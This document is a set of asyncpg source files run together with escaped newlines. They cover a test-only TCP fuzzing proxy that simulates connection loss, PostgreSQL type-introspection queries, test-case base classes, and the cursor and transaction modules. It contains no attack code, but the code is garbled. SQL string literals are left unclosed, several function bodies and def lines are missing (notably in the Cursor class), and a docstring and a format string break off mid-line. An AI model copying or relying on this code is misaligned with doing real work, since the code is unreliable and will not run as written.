asyncio.ensure_future(self.listen())\\nstarted_event.set()\\ntry:\\nawait self.listen_task\\nfinally:\\nfor c in list(self.connections):\\nc.close()\\nawait asyncio.sleep(0.01)\\nif hasattr(self.loop, 'remove_reader'):\\nself.loop.remove_reader(self.sock.fileno())\\nself.sock.close()\\n\\nasync def listen(self):\\nwhile True:\\ntry:\\nclient_sock, _ = await self._wait(\\nself.loop.sock_accept(self.sock))\\n\\nbackend_sock = socket.socket()\\nbackend_sock.setblocking(False)\\n\\nawait self._wait(self.loop.sock_connect(\\nbackend_sock, (self.backend_host, self.backend_port)))\\nexcept StopServer:\\nbreak\\n\\nconn = Connection(client_sock, backend_sock, self)\\nconn_task = self.loop.create_task(conn.handle())\\nself.connections[conn] = conn_task\\n\\ndef trigger_connectivity_loss(self):\\nself.loop.call_soon_threadsafe(self._trigger_connectivity_loss)\\n\\ndef _trigger_connectivity_loss(self):\\nself.connectivity.clear()\\nself.connectivity_loss.set()\\n\\ndef restore_connectivity(self):\\nself.loop.call_soon_threadsafe(self._restore_connectivity)\\n\\ndef _restore_connectivity(self):\\nself.connectivity.set()\\nself.connectivity_loss.clear()\\n\\ndef reset(self):\\nself.restore_connectivity()\\n\\ndef _close_connection(self, connection):\\nconn_task = self.connections.pop(connection, None)\\nif conn_task is not None:\\nconn_task.cancel()\\n\\ndef close_all_connections(self):\\nfor conn in list(self.connections):\\nself.loop.call_soon_threadsafe(self._close_connection, conn)\\n\\n\\nclass Connection:\\ndef __init__(self, client_sock, backend_sock, proxy):\\nself.client_sock = client_sock\\nself.backend_sock = backend_sock\\nself.proxy = proxy\\nself.loop = proxy.loop\\nself.connectivity = proxy.connectivity\\nself.connectivity_loss = proxy.connectivity_loss\\nself.proxy_to_backend_task = None\\nself.proxy_from_backend_task = None\\nself.is_closed = False\\n\\ndef close(self):\\nif self.is_closed:\\nreturn\\n\\nself.is_closed = True\\n\\nif self.proxy_to_backend_task is not None:\\nself.proxy_to_backend_task.cancel()\\nself.proxy_to_backend_task = None\\n\\nif self.proxy_from_backend_task is not None:\\nself.proxy_from_backend_task.cancel()\\nself.proxy_from_backend_task = None\\n\\nself.proxy._close_connection(self)\\n\\nasync def handle(self):\\nself.proxy_to_backend_task = asyncio.ensure_future(\\nself.proxy_to_backend())\\n\\nself.proxy_from_backend_task = asyncio.ensure_future(\\nself.proxy_from_backend())\\n\\ntry:\\nawait asyncio.wait(\\n[self.proxy_to_backend_task, self.proxy_from_backend_task],\\nreturn_when=asyncio.FIRST_COMPLETED)\\n\\nfinally:\\nif self.proxy_to_backend_task is not None:\\nself.proxy_to_backend_task.cancel()\\n\\nif self.proxy_from_backend_task is not None:\\nself.proxy_from_backend_task.cancel()\\n\\nself.loop.remove_reader(self.client_sock.fileno())\\nself.loop.remove_writer(self.client_sock.fileno())\\nself.loop.remove_reader(self.backend_sock.fileno())\\nself.loop.remove_writer(self.backend_sock.fileno())\\n\\nself.client_sock.close()\\nself.backend_sock.close()\\n\\nasync def _read(self, sock, n):\\nread_task = asyncio.ensure_future(\\nself.loop.sock_recv(sock, n))\\nconn_event_task = asyncio.ensure_future(\\nself.connectivity_loss.wait())\\n\\ntry:\\nawait asyncio.wait(\\n[read_task, conn_event_task],\\nreturn_when=asyncio.FIRST_COMPLETED)\\n\\nif self.connectivity_loss.is_set():\\nreturn None\\nelse:\\nreturn read_task.result()\\nfinally:\\nif not self.loop.is_closed():\\nif not read_task.done():\\nread_task.cancel()\\nif not conn_event_task.done():\\nconn_event_task.cancel()\\n\\nasync def _write(self, sock, data):\\nwrite_task = asyncio.ensure_future(\\nself.loop.sock_sendall(sock, data))\\nconn_event_task = asyncio.ensure_future(\\nself.connectivity_loss.wait())\\n\\ntry:\\nawait asyncio.wait(\\n[write_task, conn_event_task],\\nreturn_when=asyncio.FIRST_COMPLETED)\\n\\nif self.connectivity_loss.is_set():\\nreturn None\\nelse:\\nreturn write_task.result()\\nfinally:\\nif not self.loop.is_closed():\\nif not write_task.done():\\nwrite_task.cancel()\\nif not conn_event_task.done():\\nconn_event_task.cancel()\\n\\nasync def proxy_to_backend(self):\\nbuf = None\\n\\ntry:\\nwhile True:\\nawait self.connectivity.wait()\\nif buf is not None:\\ndata = buf\\nbuf = None\\nelse:\\ndata = await self._read(self.client_sock, 4096)\\nif data == b'':\\nbreak\\nif self.connectivity_loss.is_set():\\nif data:\\nbuf = data\\ncontinue\\nawait self._write(self.backend_sock, data)\\n\\nexcept ConnectionError:\\npass\\n\\nfinally:\\nif not self.loop.is_closed():\\nself.loop.call_soon(self.close)\\n\\nasync def proxy_from_backend(self):\\nbuf = None\\n\\ntry:\\nwhile True:\\nawait self.connectivity.wait()\\nif buf is not None:\\ndata = buf\\nbuf = None\\nelse:\\ndata = await self._read(self.backend_sock, 4096)\\nif data == b'':\\nbreak\\nif self.connectivity_loss.is_set():\\nif data:\\nbuf = data\\ncontinue\\nawait self._write(self.client_sock, data)\\n\\nexcept ConnectionError:\\npass\\n\\nfinally:\\nif not self.loop.is_closed():\\nself.loop.call_soon(self.close)\\n\\nfrom __future__ import annotations\\n\\nimport typing\\n\\nif typing.TYPE_CHECKING:\\nfrom . import protocol\\n\\n_TYPEINFO_13: typing.Final = '''\\\\\\n(\\nSELECT\\nt.oid                           AS oid,\\nns.nspname                      AS ns,\\nt.typname                       AS name,\\nt.typtype                       AS kind,\\n(CASE WHEN t.typtype = 'd' THEN\\n(WITH RECURSIVE typebases(oid, depth) AS (\\nSELECT\\nt2.typbasetype      AS oid,\\n0                   AS depth\\nFROM\\npg_type t2\\nWHERE\\nt2.oid = t.oid\\n\\nUNION ALL\\n\\nSELECT\\nt2.typbasetype      AS oid,\\ntb.depth + 1        AS depth\\nFROM\\npg_type t2,\\ntypebases tb\\nWHERE\\ntb.oid = t2.oid\\nAND t2.typbasetype != 0\\n) SELECT oid FROM typebases ORDER BY depth DESC LIMIT 1)\\n\\nELSE NULL\\nEND)                            AS basetype,\\nt.typelem                       AS elemtype,\\nelem_t.typdelim                 AS elemdelim,\\nrange_t.rngsubtype              AS range_subtype,\\n(CASE WHEN t.typtype = 'c' THEN\\n(SELECT\\narray_agg(ia.atttypid ORDER BY ia.attnum)\\nFROM\\npg_attribute ia\\nINNER JOIN pg_class c\\nON (ia.attrelid = c.oid)\\nWHERE\\nia.attnum > 0 AND NOT ia.attisdropped\\nAND c.reltype = t.oid)\\n\\nELSE NULL\\nEND)                            AS attrtypoids,\\n(CASE WHEN t.typtype = 'c' THEN\\n(SELECT\\narray_agg(ia.attname::text ORDER BY ia.attnum)\\nFROM\\npg_attribute ia\\nINNER JOIN pg_class c\\nON (ia.attrelid = c.oid)\\nWHERE\\nia.attnum > 0 AND NOT ia.attisdropped\\nAND c.reltype = t.oid)\\n\\nELSE NULL\\nEND)                            AS attrnames\\nFROM\\npg_catalog.pg_type AS t\\nINNER JOIN pg_catalog.pg_namespace ns ON (\\nns.oid = t.typnamespace)\\nLEFT JOIN pg_type elem_t ON (\\nt.typlen = -1 AND\\nt.typelem != 0 AND\\nt.typelem = elem_t.oid\\n)\\nLEFT JOIN pg_range range_t ON (\\nt.oid = range_t.rngtypid\\n)\\n)\\n\\n\\n_TYPEINFO: typing.Final = '''\\\\\\n(\\nSELECT\\nt.oid                           AS oid,\\nns.nspname                      AS ns,\\nt.typname                       AS name,\\nt.typtype                       AS kind,\\n(CASE WHEN t.typtype = 'd' THEN\\n(WITH RECURSIVE typebases(oid, depth) AS (\\nSELECT\\nt2.typbasetype      AS oid,\\n0                   AS depth\\nFROM\\npg_type t2\\nWHERE\\nt2.oid = t.oid\\n\\nUNION ALL\\n\\nSELECT\\nt2.typbasetype      AS oid,\\ntb.depth + 1        AS depth\\nFROM\\npg_type t2,\\ntypebases tb\\nWHERE\\ntb.oid = t2.oid\\nAND t2.typbasetype != 0\\n) SELECT oid FROM typebases ORDER BY depth DESC LIMIT 1)\\n\\nELSE NULL\\nEND)                            AS basetype,\\nt.typelem                       AS elemtype,\\nelem_t.typdelim                 AS elemdelim,\\nCOALESCE(\\nrange_t.rngsubtype,\\nmultirange_t.rngsubtype)    AS range_subtype,\\n(CASE WHEN t.typtype = 'c' THEN\\n(SELECT\\narray_agg(ia.atttypid ORDER BY ia.attnum)\\nFROM\\npg_attribute ia\\nINNER JOIN pg_class c\\nON (ia.attrelid = c.oid)\\nWHERE\\nia.attnum > 0 AND NOT ia.attisdropped\\nAND c.reltype = t.oid)\\n\\nELSE NULL\\nEND)                            AS attrtypoids,\\n(CASE WHEN t.typtype = 'c' THEN\\n(SELECT\\narray_agg(ia.attname::text ORDER BY ia.attnum)\\nFROM\\npg_attribute ia\\nINNER JOIN pg_class c\\nON (ia.attrelid = c.oid)\\nWHERE\\nia.attnum > 0 AND NOT ia.attisdropped\\nAND c.reltype = t.oid)\\n\\nELSE NULL\\nEND)                            AS attrnames\\nFROM\\npg_catalog.pg_type AS t\\nINNER JOIN pg_catalog.pg_namespace ns ON (\\nns.oid = t.typnamespace)\\nLEFT JOIN pg_type elem_t ON (\\nt.typlen = -1 AND\\nt.typelem != 0 AND\\nt.typelem = elem_t.oid\\n)\\nLEFT JOIN pg_range range_t ON (\\nt.oid = range_t.rngtypid\\n)\\nLEFT JOIN pg_range multirange_t ON (\\nt.oid = multirange_t.rngmultitypid\\n)\\n)\\n\\n\\nTYPE_BY_NAME: typing.Final = '''\\\\\\nSELECT\\nt.oid,\\nt.typelem     AS elemtype,\\nt.typtype     AS kind\\nFROM\\npg_catalog.pg_type AS t\\nINNER JOIN pg_catalog.pg_namespace ns ON (ns.oid = t.typnamespace)\\nWHERE\\nt.typname = $1 AND ns.nspname = $2\\n\\n\\nSCALAR_TYPE_KINDS = (b'b', b'd', b'e')\\n\\n\\ndef is_scalar_type(typeinfo: protocol.Record) -> bool:\\nreturn (\\ntypeinfo['kind'] in SCALAR_TYPE_KINDS and\\nnot typeinfo['elemtype']\\n)\\n\\n\\ndef is_domain_type(typeinfo: protocol.Record) -> bool:\\nreturn typeinfo['kind'] == b'd'\\n\\n\\ndef is_composite_type(typeinfo: protocol.Record) -> bool:\\nreturn typeinfo['kind'] == b'c'\\n\\nfrom __future__ import annotations\\n\\nimport asyncio\\nimport functools\\nimport sys\\nimport typing\\n\\nif typing.TYPE_CHECKING:\\nfrom . import compat\\n\\nif sys.version_info < (3, 11):\\nfrom async_timeout import timeout as timeout_ctx\\nelse:\\nfrom asyncio import timeout as timeout_ctx\\n\\n_T = typing.TypeVar('_T')\\n\\n\\nasync def wait_for(fut: compat.Awaitable[_T], timeout: float | None) -> _T:\\n\\nif timeout is not None and timeout <= 0:\\nfut = asyncio.ensure_future(fut)\\n\\nif fut.done():\\nreturn fut.result()\\n\\nawait _cancel_and_wait(fut)\\ntry:\\nreturn fut.result()\\nexcept asyncio.CancelledError as exc:\\nraise TimeoutError from exc\\n\\nasync with timeout_ctx(timeout):\\nreturn await fut\\n\\n\\nasync def _cancel_and_wait(fut: asyncio.Future[_T]) -> None:\\n\\n\\nimport asyncio\\nimport atexit\\nimport contextlib\\nimport functools\\nimport inspect\\nimport logging\\nimport os\\nimport re\\nimport textwrap\\nimport time\\nimport traceback\\nimport unittest\\n\\n\\nimport asyncpg\\nfrom asyncpg import cluster as pg_cluster\\nfrom asyncpg import connection as pg_connection\\nfrom asyncpg import pool as pg_pool\\n\\nfrom . import fuzzer\\n\\n\\n@contextlib.contextmanager\\ndef silence_asyncio_long_exec_warning():\\ndef flt(log_record):\\nmsg = log_record.getMessage()\\nreturn not msg.startswith('Executing ')\\n\\nlogger = logging.getLogger('asyncio')\\nlogger.addFilter(flt)\\ntry:\\nyield\\nfinally:\\nlogger.removeFilter(flt)\\n\\n\\ndef with_timeout(timeout):\\ndef wrap(func):\\nfunc.__timeout__ = timeout\\nreturn func\\n\\nreturn wrap\\n\\n\\nclass TestCaseMeta(type(unittest.TestCase)):\\nTEST_TIMEOUT = None\\n\\n@staticmethod\\ndef _iter_methods(bases, ns):\\nfor base in bases:\\nfor methname in dir(base):\\nif not methname.startswith('test_'):\\ncontinue\\n\\nmeth = getattr(base, methname)\\nif not inspect.iscoroutinefunction(meth):\\ncontinue\\n\\nyield methname, meth\\n\\nfor methname, meth in ns.items():\\nif not methname.startswith('test_'):\\ncontinue\\n\\nif not inspect.iscoroutinefunction(meth):\\ncontinue\\n\\nyield methname, meth\\n\\ndef __new__(mcls, name, bases, ns):\\nfor methname, meth in mcls._iter_methods(bases, ns):\\n@functools.wraps(meth)\\ndef wrapper(self, *args, __meth__=meth, **kwargs):\\ncoro = __meth__(self, *args, **kwargs)\\ntimeout = getattr(__meth__, '__timeout__', mcls.TEST_TIMEOUT)\\nif timeout:\\ncoro = asyncio.wait_for(coro, timeout)\\ntry:\\nself.loop.run_until_complete(coro)\\nexcept asyncio.TimeoutError:\\nraise self.failureException(\\n'test timed out after {} seconds'.format(\\ntimeout)) from None\\nelse:\\nself.loop.run_until_complete(coro)\\nns[methname] = wrapper\\n\\nreturn super().__new__(mcls, name, bases, ns)\\n\\n\\nclass TestCase(unittest.TestCase, metaclass=TestCaseMeta):\\n\\n@classmethod\\ndef setUpClass(cls):\\nif os.environ.get('USE_UVLOOP'):\\nimport uvloop\\nasyncio.set_event_loop_policy(uvloop.EventLoopPolicy())\\n\\nloop = asyncio.new_event_loop()\\nasyncio.set_event_loop(None)\\ncls.loop = loop\\n\\n@classmethod\\ndef tearDownClass(cls):\\ncls.loop.close()\\nasyncio.set_event_loop(None)\\n\\ndef setUp(self):\\nself.loop.set_exception_handler(self.loop_exception_handler)\\nself.__unhandled_exceptions = []\\n\\ndef tearDown(self):\\nexcs = []\\nfor exc in self.__unhandled_exceptions:\\nif isinstance(exc, ConnectionResetError):\\ntexc = traceback.TracebackException.from_exception(\\nexc, lookup_lines=False)\\nif texc.stack[-1].name == \\\"_call_connection_lost\\\":\\ncontinue\\nexcs.append(exc)\\n\\nif excs:\\nformatted = []\\n\\nfor i, context in enumerate(excs):\\nformatted.append(self._format_loop_exception(context, i + 1))\\n\\nself.fail(\\n'unexpected exceptions in asynchronous code:\\\\n' +\\n'\\\\n'.join(formatted))\\n\\n@contextlib.contextmanager\\ndef assertRunUnder(self, delta):\\nst = time.monotonic()\\ntry:\\nyield\\nfinally:\\nelapsed = time.monotonic() - st\\nif elapsed > delta:\\nraise AssertionError(\\n'running block took {:0.3f}s which is longer '\\n'than the expected maximum of {:0.3f}s'.format(\\nelapsed, delta))\\n\\n@contextlib.contextmanager\\ndef assertLoopErrorHandlerCalled(self, msg_re: str):\\ncontexts = []\\n\\ndef handler(loop, ctx):\\ncontexts.append(ctx)\\n\\nold_handler = self.loop.get_exception_handler()\\nself.loop.set_exception_handler(handler)\\ntry:\\nyield\\n\\nfor ctx in contexts:\\nmsg = ctx.get('message')\\nif msg and re.search(msg_re, msg):\\nreturn\\n\\nraise AssertionError(\\n'no message matching {!r} was logged with '\\n'loop.call_exception_handler()'.format(msg_re))\\n\\nfinally:\\nself.loop.set_exception_handler(old_handler)\\n\\ndef loop_exception_handler(self, loop, context):\\nself.__unhandled_exceptions.append(context)\\nloop.default_exception_handler(context)\\n\\ndef _format_loop_exception(self, context, n):\\nmessage = context.get('message', 'Unhandled exception in event loop')\\nexception = context.get('exception')\\nif exception is not None:\\nexc_info = (type(exception), exception, exception.__traceback__)\\nelse:\\nexc_info = None\\n\\nlines = []\\nfor key in sorted(context):\\nif key in {'message', 'exception'}:\\ncontinue\\nvalue = context[key]\\nif key == 'source_traceback':\\ntb = ''.join(traceback.format_list(value))\\nvalue = 'Object created at (most recent call last):\\\\n'\\nvalue += tb.rstrip()\\nelse:\\ntry:\\nvalue = repr(value)\\nexcept Exception as ex:\\nvalue = ('Exception in __repr__ {!r}; '\\n'value type: {!r}'.format(ex, type(value)))\\nlines.append('[{}]: {}\\\\n\\\\n'.format(key, value))\\n\\nif exc_info is not None:\\nlines.append('[exception]:\\\\n')\\nformatted_exc = textwrap.indent(\\n''.join(traceback.format_exception(*exc_info)), '  ')\\nlines.append(formatted_exc)\\n\\ndetails = textwrap.indent(''.join(lines), '    ')\\nreturn '{:02d}. {}:\\\\n{}\\\\n'.format(n, message, details)\\n\\n\\n_default_cluster = None\\n\\n\\ndef _init_cluster(ClusterCls, cluster_kwargs, initdb_options=None):\\ncluster = ClusterCls(**cluster_kwargs)\\ncluster.init(**(initdb_options or {}))\\ncluster.trust_local_connections()\\natexit.register(_shutdown_cluster, cluster)\\nreturn cluster\\n\\n\\ndef _get_initdb_options(initdb_options=None):\\nif not initdb_options:\\ninitdb_options = {}\\nelse:\\ninitdb_options = dict(initdb_options)\\n\\nif 'username' not in initdb_options:\\ninitdb_options['username'] = 'postgres'\\n\\nreturn initdb_options\\n\\n\\ndef _init_default_cluster(initdb_options=None):\\nglobal _default_cluster\\n\\nif _default_cluster is None:\\npg_host = os.environ.get('PGHOST')\\nif pg_host:\\n_default_cluster = pg_cluster.RunningCluster()\\nelse:\\n_default_cluster = _init_cluster(\\npg_cluster.TempCluster,\\ncluster_kwargs={\\n\\\"data_dir_suffix\\\": \\\".apgtest\\\",\\n},\\ninitdb_options=_get_initdb_options(initdb_options),\\n)\\n\\nreturn _default_cluster\\n\\n\\ndef _shutdown_cluster(cluster):\\nif cluster.get_status() == 'running':\\ncluster.stop()\\nif cluster.get_status() != 'not-initialized':\\ncluster.destroy()\\n\\n\\ndef create_pool(dsn=None, *,\\nmin_size=10,\\nmax_size=10,\\nmax_queries=50000,\\nmax_inactive_connection_lifetime=60.0,\\nconnect=None,\\nsetup=None,\\ninit=None,\\nloop=None,\\npool_class=pg_pool.Pool,\\nconnection_class=pg_connection.Connection,\\nrecord_class=asyncpg.Record,\\n**connect_kwargs):\\nreturn pool_class(\\ndsn,\\nmin_size=min_size,\\nmax_size=max_size,\\nmax_queries=max_queries,\\nloop=loop,\\nconnect=connect,\\nsetup=setup,\\ninit=init,\\nmax_inactive_connection_lifetime=max_inactive_connection_lifetime,\\nconnection_class=connection_class,\\nrecord_class=record_class,\\n**connect_kwargs,\\n)\\n\\n\\nclass ClusterTestCase(TestCase):\\n@classmethod\\ndef get_server_settings(cls):\\nsettings = {\\n'log_connections': 'on'\\n}\\n\\nif cls.cluster.get_pg_version() >= (11, 0):\\nsettings['jit'] = 'off'\\n\\nreturn settings\\n\\n@classmethod\\ndef new_cluster(cls, ClusterCls, *, cluster_kwargs={}, initdb_options={}):\\ncluster = _init_cluster(ClusterCls, cluster_kwargs,\\n_get_initdb_options(initdb_options))\\ncls._clusters.append(cluster)\\nreturn cluster\\n\\n@classmethod\\ndef start_cluster(cls, cluster, *, server_settings={}):\\ncluster.start(port='dynamic', server_settings=server_settings)\\n\\n@classmethod\\ndef setup_cluster(cls):\\ncls.cluster = _init_default_cluster()\\n\\nif cls.cluster.get_status() != 'running':\\ncls.cluster.start(\\nport='dynamic', server_settings=cls.get_server_settings())\\n\\n@classmethod\\ndef setUpClass(cls):\\nsuper().setUpClass()\\ncls._clusters = []\\ncls.setup_cluster()\\n\\n@classmethod\\ndef tearDownClass(cls):\\nsuper().tearDownClass()\\nfor cluster in cls._clusters:\\nif cluster is not _default_cluster:\\ncluster.stop()\\ncluster.destroy()\\ncls._clusters = []\\n\\n@classmethod\\ndef get_connection_spec(cls, kwargs={}):\\nconn_spec = cls.cluster.get_connection_spec()\\nif kwargs.get('dsn'):\\nconn_spec.pop('host')\\nconn_spec.update(kwargs)\\nif not os.environ.get('PGHOST') and not kwargs.get('dsn'):\\nif 'database' not in conn_spec:\\nconn_spec['database'] = 'postgres'\\nif 'user' not in conn_spec:\\nconn_spec['user'] = 'postgres'\\nreturn conn_spec\\n\\n@classmethod\\ndef connect(cls, **kwargs):\\nconn_spec = cls.get_connection_spec(kwargs)\\nreturn pg_connection.connect(**conn_spec, loop=cls.loop)\\n\\ndef setUp(self):\\nsuper().setUp()\\nself._pools = []\\n\\ndef tearDown(self):\\nsuper().tearDown()\\nfor pool in self._pools:\\npool.terminate()\\nself._pools = []\\n\\ndef create_pool(self, pool_class=pg_pool.Pool,\\nconnection_class=pg_connection.Connection, **kwargs):\\nconn_spec = self.get_connection_spec(kwargs)\\npool = create_pool(loop=self.loop, pool_class=pool_class,\\nconnection_class=connection_class, **conn_spec)\\nself._pools.append(pool)\\nreturn pool\\n\\n\\nclass ProxiedClusterTestCase(ClusterTestCase):\\n@classmethod\\ndef get_server_settings(cls):\\nsettings = dict(super().get_server_settings())\\nsettings['listen_addresses'] = '127.0.0.1'\\nreturn settings\\n\\n@classmethod\\ndef get_proxy_settings(cls):\\nreturn {'fuzzing-mode': None}\\n\\n@classmethod\\ndef setUpClass(cls):\\nsuper().setUpClass()\\nconn_spec = cls.cluster.get_connection_spec()\\nhost = conn_spec.get('host')\\nif not host:\\nhost = '127.0.0.1'\\nelif host.startswith('/'):\\nhost = '127.0.0.1'\\ncls.proxy = fuzzer.TCPFuzzingProxy(\\nbackend_host=host,\\nbackend_port=conn_spec['port'],\\n)\\ncls.proxy.start()\\n\\n@classmethod\\ndef tearDownClass(cls):\\ncls.proxy.stop()\\nsuper().tearDownClass()\\n\\n@classmethod\\ndef get_connection_spec(cls, kwargs):\\nconn_spec = super().get_connection_spec(kwargs)\\nconn_spec['host'] = cls.proxy.listening_addr\\nconn_spec['port'] = cls.proxy.listening_port\\nreturn conn_spec\\n\\ndef tearDown(self):\\nself.proxy.reset()\\nsuper().tearDown()\\n\\n\\ndef with_connection_options(**options):\\nif not options:\\nraise ValueError('no connection options were specified')\\n\\ndef wrap(func):\\nfunc.__connect_options__ = options\\nreturn func\\n\\nreturn wrap\\n\\n\\nclass ConnectedTestCase(ClusterTestCase):\\n\\ndef setUp(self):\\nsuper().setUp()\\n\\ntest_func = getattr(self, self._testMethodName).__func__\\nopts = getattr(test_func, '__connect_options__', {})\\nself.con = self.loop.run_until_complete(self.connect(**opts))\\nself.server_version = self.con.get_server_version()\\n\\ndef tearDown(self):\\ntry:\\nself.loop.run_until_complete(self.con.close())\\nself.con = None\\nfinally:\\nsuper().tearDown()\\n\\n\\nclass HotStandbyTestCase(ClusterTestCase):\\n\\n@classmethod\\ndef setup_cluster(cls):\\ncls.master_cluster = cls.new_cluster(pg_cluster.TempCluster)\\ncls.start_cluster(\\ncls.master_cluster,\\nserver_settings={\\n'max_wal_senders': 10,\\n'wal_level': 'hot_standby'\\n}\\n)\\n\\ncon = None\\n\\ntry:\\ncon = cls.loop.run_until_complete(\\ncls.master_cluster.connect(\\ndatabase='postgres', user='postgres', loop=cls.loop))\\n\\ncls.loop.run_until_complete(\\ncon.execute('''\\nCREATE ROLE replication WITH LOGIN REPLICATION\\n\\n\\nfrom __future__ import annotations\\n\\nfrom .protocol import Protocol, Record, NO_TIMEOUT, BUILTIN_TYPE_NAME_MAP\\n\\n\\nimport collections\\n\\nfrom . import connresource\\nfrom . import exceptions\\n\\n\\nclass CursorFactory(connresource.ConnectionResource):\\n\\n__slots__ = (\\n'_state',\\n'_args',\\n'_prefetch',\\n'_query',\\n'_timeout',\\n'_record_class',\\n)\\n\\ndef __init__(\\nself,\\nconnection,\\nquery,\\nstate,\\nargs,\\nprefetch,\\ntimeout,\\nrecord_class\\n):\\nsuper().__init__(connection)\\nself._args = args\\nself._prefetch = prefetch\\nself._query = query\\nself._timeout = timeout\\nself._state = state\\nself._record_class = record_class\\nif state is not None:\\nstate.attach()\\n\\n@connresource.guarded\\ndef __aiter__(self):\\nprefetch = 50 if self._prefetch is None else self._prefetch\\nreturn CursorIterator(\\nself._connection,\\nself._query,\\nself._state,\\nself._args,\\nself._record_class,\\nprefetch,\\nself._timeout,\\n)\\n\\n@connresource.guarded\\ndef __await__(self):\\nif self._prefetch is not None:\\nraise exceptions.InterfaceError(\\n'prefetch argument can only be specified for iterable cursor')\\ncursor = Cursor(\\nself._connection,\\nself._query,\\nself._state,\\nself._args,\\nself._record_class,\\n)\\nreturn cursor._init(self._timeout).__await__()\\n\\ndef __del__(self):\\nif self._state is not None:\\nself._state.detach()\\nself._connection._maybe_gc_stmt(self._state)\\n\\n\\nclass BaseCursor(connresource.ConnectionResource):\\n\\n__slots__ = (\\n'_state',\\n'_args',\\n'_portal_name',\\n'_exhausted',\\n'_query',\\n'_record_class',\\n)\\n\\ndef __init__(self, connection, query, state, args, record_class):\\nsuper().__init__(connection)\\nself._args = args\\nself._state = state\\nif state is not None:\\nstate.attach()\\nself._portal_name = None\\nself._exhausted = False\\nself._query = query\\nself._record_class = record_class\\n\\ndef _check_ready(self):\\nif self._state is None:\\nraise exceptions.InterfaceError(\\n'cursor: no associated prepared statement')\\n\\nif self._state.closed:\\nraise exceptions.InterfaceError(\\n'cursor: the prepared statement is closed')\\n\\nif not self._connection._top_xact:\\nraise exceptions.NoActiveSQLTransactionError(\\n'cursor cannot be created outside of a transaction')\\n\\nasync def _bind_exec(self, n, timeout):\\nself._check_ready()\\n\\nif self._portal_name:\\nraise exceptions.InterfaceError(\\n'cursor already has an open portal')\\n\\ncon = self._connection\\nprotocol = con._protocol\\n\\nself._portal_name = con._get_unique_id('portal')\\nbuffer, _, self._exhausted = await protocol.bind_execute(\\nself._state, self._args, self._portal_name, n, True, timeout)\\nreturn buffer\\n\\nasync def _bind(self, timeout):\\nself._check_ready()\\n\\nif self._portal_name:\\nraise exceptions.InterfaceError(\\n'cursor already has an open portal')\\n\\ncon = self._connection\\nprotocol = con._protocol\\n\\nself._portal_name = con._get_unique_id('portal')\\nbuffer = await protocol.bind(self._state, self._args,\\nself._portal_name,\\ntimeout)\\nreturn buffer\\n\\nasync def _exec(self, n, timeout):\\nself._check_ready()\\n\\nif not self._portal_name:\\nraise exceptions.InterfaceError(\\n'cursor does not have an open portal')\\n\\nprotocol = self._connection._protocol\\nbuffer, _, self._exhausted = await protocol.execute(\\nself._state, self._portal_name, n, True, timeout)\\nreturn buffer\\n\\nasync def _close_portal(self, timeout):\\nself._check_ready()\\n\\nif not self._portal_name:\\nraise exceptions.InterfaceError(\\n'cursor does not have an open portal')\\n\\nprotocol = self._connection._protocol\\nawait protocol.close_portal(self._portal_name, timeout)\\nself._portal_name = None\\n\\ndef __repr__(self):\\nattrs = []\\nif self._exhausted:\\nattrs.append('exhausted')\\nattrs.append('')\\n\\nif self.__class__.__module__.startswith('asyncpg.'):\\nmod = 'asyncpg'\\nelse:\\nmod = self.__class__.__module__\\n\\nreturn '<{}.{} \\\"{!s:.30}\\\" {}{:\\nmod, self.__class__.__name__,\\nself._state.query,\\n' '.join(attrs), id(self))\\n\\ndef __del__(self):\\nif self._state is not None:\\nself._state.detach()\\nself._connection._maybe_gc_stmt(self._state)\\n\\n\\nclass CursorIterator(BaseCursor):\\n\\n__slots__ = ('_buffer', '_prefetch', '_timeout')\\n\\ndef __init__(\\nself,\\nconnection,\\nquery,\\nstate,\\nargs,\\nrecord_class,\\nprefetch,\\ntimeout\\n):\\nsuper().__init__(connection, query, state, args, record_class)\\n\\nif prefetch <= 0:\\nraise exceptions.InterfaceError(\\n'prefetch argument must be greater than zero')\\n\\nself._buffer = collections.deque()\\nself._prefetch = prefetch\\nself._timeout = timeout\\n\\n@connresource.guarded\\ndef __aiter__(self):\\nreturn self\\n\\n@connresource.guarded\\nasync def __anext__(self):\\nif self._state is None:\\nself._state = await self._connection._get_statement(\\nself._query,\\nself._timeout,\\nnamed=True,\\nrecord_class=self._record_class,\\n)\\nself._state.attach()\\n\\nif not self._portal_name and not self._exhausted:\\nbuffer = await self._bind_exec(self._prefetch, self._timeout)\\nself._buffer.extend(buffer)\\n\\nif not self._buffer and not self._exhausted:\\nbuffer = await self._exec(self._prefetch, self._timeout)\\nself._buffer.extend(buffer)\\n\\nif self._portal_name and self._exhausted:\\nawait self._close_portal(self._timeout)\\n\\nif self._buffer:\\nreturn self._buffer.popleft()\\n\\nraise StopAsyncIteration\\n\\n\\nclass Cursor(BaseCursor):\\nself._check_ready()\\nif n <= 0:\\nraise exceptions.InterfaceError('n must be greater than zero')\\nif self._exhausted:\\nreturn []\\nrecs = await self._exec(n, timeout)\\nif len(recs) < n:\\nself._exhausted = True\\nreturn recs\\n\\n@connresource.guarded\\nasync def fetchrow(self, *, timeout=None):\\nr\\\"\\\"\\\"Return the next row.\\n\\n:param float timeout: Optional timeout value in seconds.\\n\\n:return: A :class:`Record` instance.\\nself._check_ready()\\nif n <= 0:\\nraise exceptions.InterfaceError('n must be greater than zero')\\n\\nprotocol = self._connection._protocol\\nstatus = await protocol.query('MOVE FORWARD {:d} {}'.format(\\nn, self._portal_name), timeout)\\n\\nadvanced = int(status.split()[1])\\nif advanced < n:\\nself._exhausted = True\\n\\nreturn advanced\\n\\n\\nimport enum\\n\\nfrom . import connresource\\nfrom . import exceptions as apg_errors\\n\\n\\nclass TransactionState(enum.Enum):\\nNEW = 0\\nSTARTED = 1\\nCOMMITTED = 2\\nROLLEDBACK = 3\\nFAILED = 4\\n\\n\\nISOLATION_LEVELS = {\\n'read_committed',\\n'read_uncommitted',\\n'serializable',\\n'repeatable_read',\\n}\\nISOLATION_LEVELS_BY_VALUE = {\\n'read committed': 'read_committed',\\n'read uncommitted': 'read_uncommitted',\\n'serializable': 'serializable',\\n'repeatable read': 'repeatable_read',\\n}\\n\\n\\nclass Transaction(connresource.ConnectionResource):\\n\\n__slots__ = ('_connection', '_isolation', '_readonly', '_deferrable',\\n'_state', '_nested', '_id', '_managed')\\n\\ndef __init__(self, connection, isolation, readonly, deferrable):\\nsuper().__init__(connection)\\n\\nif isolation and isolation not in ISOLATION_LEVELS:\\nraise ValueError(\\n'isolation is expected to be either of {}, '\\n'got {!r}'.format(ISOLATION_LEVELS, isolation))\\n\\nself._isolation = isolation\\nself._readonly = readonly\\nself._deferrable = deferrable\\nself._state = 